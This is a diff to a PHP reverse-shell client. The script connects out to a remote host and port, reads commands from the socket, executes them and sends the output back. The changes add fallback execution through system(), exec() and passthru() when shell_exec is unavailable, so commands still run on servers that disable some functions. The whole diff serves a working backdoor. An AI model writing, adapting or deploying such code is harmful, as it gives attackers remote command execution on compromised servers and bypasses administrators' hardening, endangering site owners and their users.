@@ -34,7 +34,8 @@
 	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
 
 	while (true) {
-	$now = date('d/m H:i:s');
+
+		$now = date('d/m H:i:s');
 
 	    if(($recv = socket_read($socket, 1024)) === false || $recv === "")
 	    {
@@ -49,12 +50,66 @@
 				$full_cmd = preg_replace("(exec)", "", $full_cmd);
 				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
 
-				if(!($result = shell_exec($full_cmd)))
+
+				if(function_exists('shell_exec'))
 				{
-					$result = "Error";
+					$fnc = "shell_exec()";
+					if(!($result = @shell_exec($full_cmd)))
+					{
+						$result = "Error";
+						break;
+					}
 				}
 
-				$result .= "\ncmd:: $full_cmd";
+				else if(function_exists('system'))
+				{ 	
+					$fnc = "system()";
+					@ob_start(); 	
+
+					if(!($result = @system($full_cmd)))
+					{
+						$result = "Error";
+						break;
+					}
+
+					$result = @ob_get_contents(); 		
+					@ob_end_clean(); 
+				}
+
+				else if(function_exists('exec'))
+				{ 
+					$fnc = "exec()";
+					@exec($full_cmd,$results,$ret_status);
+
+					if($ret_status !== 0)
+					{
+						$result = "Error";
+						break;
+					}
+
+					$result = ""; 		
+
+					foreach($results as $res)
+					{ 			
+						$result .= $res."\n\r"; 		
+					} 
+				}
+
+				else if(function_exists('passthru'))
+				{ 		
+					$fnc = "passthru()";
+					@ob_start(); 		
+					@passthru($full_cmd); 		
+					$result = @ob_get_contents(); 		
+					@ob_end_clean(); 
+				}
+
+				else
+				{
+					$result = "Error :: System calls disabled..";
+				}
+
+				$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
 
 	    		if(socket_write($socket, $result, strlen($result)) === false)
 	    		{	
